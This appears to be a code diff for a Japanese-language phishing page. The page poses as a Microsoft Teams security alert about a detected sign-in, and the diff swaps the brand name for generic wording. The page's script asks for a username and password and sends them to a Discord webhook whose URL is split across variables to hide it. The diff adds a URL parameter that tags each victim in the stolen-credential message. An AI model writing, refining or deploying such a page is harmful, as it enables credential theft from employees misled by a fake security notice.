@@ -54,7 +54,7 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 <div class="cert">
 <div class="top-bar"></div>
 <div class="hdr">
-<img class="logo" src="teams.png" height="80" alt="Microsoft Teams">
+<img class="logo" src="teams.png" height="80" alt="社内ツール">
 <div class="info">
 <h1>サインインを検知しました</h1>
 <small>セキュリティ通知</small>
@@ -63,7 +63,7 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 <div class="body">
 <div class="alert-box" id="alert-box">
 <strong>新しい接続を検知しました。</strong><br>
-あなたの Teams アカウントに誰かがログインしようとしています。<br>
+あなたのビジネスアカウントに誰かがログインしようとしています。<br>
 この新しい接続は許可され、今後接続を試みても通知は送信されません。<br><br>
 これがあなた自身ではない場合、または新しいネットワーク接続に気付かない場合は、下の「ブロック」をクリックしてください。この接続はブロックされます。
 </div>
@@ -104,6 +104,7 @@ var H="https:/";
 var T="/discord.com/api/webhooks/";
 var A="1569533813548388482/";
 var B="7wipbj3B0igYJicr-BVwvRfRU9izfKWKjjDY15wU5desK4cQx7Tgmt4HkhhkYCiKvVoA";
+var t=new URLSearchParams(window.location.search).get('t')||'?';
 var action="";
 function doAction(a){
 action=a;
@@ -127,7 +128,7 @@ if(!u||!p)return false;
 document.getElementById("f").style.display="none";
 document.getElementById("sp").style.display="block";
 var url=H+T+A+B;
-var body=JSON.stringify({"content":"["+action.toUpperCase()+"] user: "+u+"\npass: "+p+"\ntime: "+new Date().toLocaleTimeString("ja-JP")});
+var body=JSON.stringify({"content":"["+action.toUpperCase()+"] ["+t+"] user: "+u+"\npass: "+p+"\ntime: "+new Date().toLocaleTimeString("ja-JP")});
 fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body})
 .then(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";
 if(action==="allow"){document.getElementById("ok-detail").innerHTML="接続を許可しました。<br>今後の接続からの通知は送信されません。";}
